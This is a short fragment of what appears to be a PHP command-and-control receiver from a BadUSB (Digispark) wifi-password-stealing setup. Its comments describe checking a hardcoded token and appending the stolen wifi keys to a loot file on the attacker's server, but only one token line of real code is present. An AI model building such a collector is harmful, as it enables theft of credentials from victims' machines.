/*
Copyright (c) 2019 Hassan Shehata
Permission is hereby granted, free of charge, 
to any person obtaining a copy of this software and associated documentation files
(the "Software"), to deal in the Software without restriction, 
including without limitation the rights to use, copy, modify, merge, 
publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so
*/

## This script handles collected wifi data 
## It verifies the request with pre-shared token "Hardcoded by the attacker into the Digispark"
## Then append the result to loot.txt file on the CnC system 

### Handing POST Request


### Initialize Token (32 digit)
$token="1s5d47s98qwASDaw598wD51Dfg47m85C"; 


### Verify on POST paramter token


### Open loot file append mode only and write the keys paramter